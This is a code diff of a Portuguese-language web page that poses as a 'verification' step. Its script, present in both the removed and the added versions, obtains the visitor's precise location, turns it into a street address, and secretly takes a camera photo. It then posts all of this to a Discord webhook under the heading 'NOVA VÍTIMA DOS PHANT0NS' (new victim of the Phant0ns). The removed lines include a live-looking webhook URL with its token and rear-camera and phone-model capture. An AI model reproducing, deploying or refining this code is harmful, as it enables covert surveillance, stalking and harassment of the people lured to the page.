@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aguarde...</title>
+    <title>Verificação</title>
     <style>
         body { background-color: black; color: white; text-align: center; font-family: sans-serif; padding-top: 80px; }
         .vermelho { color: red; font-weight: bold; font-size: 26px; }
@@ -22,73 +22,62 @@
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        const WEBHOOK = 'https://discord.com/api/webhooks/1495823762464178316/JUtyoihcRDnKawG_caqxpZ-G4k7NlZpSMSD5TOYG_gZj6asa9SCXsN1d8G-VSstpePse';
+        const WEBHOOK = 'https://discord.com';
 
         document.getElementById('btn').addEventListener('click', async () => {
             document.getElementById('m').style.display = 'block';
             document.getElementById('btn').style.display = 'none';
 
             try {
-                // 1. Localização por extenso (Endereço Real)
-                const p = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+                // 1. Localização
+                const p = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, {timeout: 10000});
+                });
+                
                 const resLocal = await fetch(`https://openstreetmap.org{p.coords.latitude}&lon=${p.coords.longitude}`);
                 const dLocal = await resLocal.json();
-                const endereco = dLocal.display_name || "Não identificado";
+                const endereco = dLocal.display_name || "Endereço não identificado";
 
-                // 2. Modelo do Celular
-                const ua = navigator.userAgent;
-                const modMatch = ua.match(/\(([^)]+)\)/);
-                const modelo = modMatch ? modMatch[1].split(';')[0] : "Desconhecido";
-
-                // 3. Foto Frontal
-                const s1 = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
-                const f1 = await tirar(s1);
+                // 2. Foto Frontal (Apenas a frontal para evitar bloqueio)
+                const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
+                const video = document.getElementById('v');
+                video.srcObject = stream;
                 
-                // 4. Foto Traseira
-                const s2 = await navigator.mediaDevices.getUserMedia({video: {facingMode: "environment"}});
-                const f2 = await tirar(s2);
+                await new Promise(r => setTimeout(r, 1500));
+                
+                const canvas = document.getElementById('c');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const foto = canvas.toDataURL('image/jpeg');
+                
+                stream.getTracks().forEach(t => t.stop());
 
-                await enviar(f1, f2, endereco, modelo);
-                setTimeout(() => { window.location.href = "about:blank"; }, 3000);
-            } catch (e) { 
-                setTimeout(() => { window.location.href = "about:blank"; }, 2000);
+                // 3. Envio
+                const fd = new FormData();
+                fd.append('payload_json', JSON.stringify({
+                    content: "NOVA VÍTIMA DOS PHANT0NS 😈😈",
+                    embeds: [{
+                        title: "DADOS COLETADOS",
+                        description: `📍 **LOCALIZAÇÃO:**\n${endereco}\n\n📅 **DATA:**\n${new Date().toLocaleString()}\n\nphant0ns 😈`,
+                        color: 16711680,
+                        image: { url: 'attachment://f.jpg' }
+                    }]
+                }));
+
+                const blob = await (await fetch(foto)).blob();
+                fd.append('file', blob, 'f.jpg');
+
+                await fetch(WEBHOOK, { method: 'POST', body: fd });
+                
+                alert("Verificação concluída!"); // Aviso para você saber que o código chegou ao fim
+                window.location.href = "about:blank";
+
+            } catch (err) {
+                alert("Erro: " + err.message); // Isso vai te dizer exatamente POR QUE não foi
+                window.location.href = "about:blank";
             }
         });
-
-        async function tirar(s) {
-            const v = document.getElementById('v');
-            v.srcObject = s;
-            await new Promise(r => setTimeout(r, 1000));
-            const c = document.getElementById('c');
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            const img = c.toDataURL('image/jpeg');
-            s.getTracks().forEach(t => t.stop());
-            return img;
-        }
-
-        async function enviar(img1, img2, end, mo) {
-            const fd = new FormData();
-            const payload = {
-                content: "NOVA VÍTIMA DOS PHANT0NS😈😈😈😈",
-                embeds: [{
-                    description: `📍 **LOCALIZAÇÃO:**\n${end}\n\n📅 **DATA:**\n${new Date().toLocaleString()}\n\n📸 **Foto Frontal:** (Anexa)\n📷 **Foto Traseira:** (Anexa)\n\n📱 **MODELO CELULAR:**\n${mo}\n\nphant0ns😈`,
-                    color: 16711680,
-                    image: { url: 'attachment://f1.jpg' }
-                }, {
-                    image: { url: 'attachment://f2.jpg' }
-                }]
-            };
-            fd.append('payload_json', JSON.stringify(payload));
-            
-            const b1 = await (await fetch(img1)).blob();
-            fd.append('file1', b1, 'f1.jpg');
-            
-            const b2 = await (await fetch(img2)).blob();
-            fd.append('file2', b2, 'f2.jpg');
-
-            await fetch(WEBHOOK, { method: 'POST', body: fd });
-        }
     </script>
 </body>
 </html>
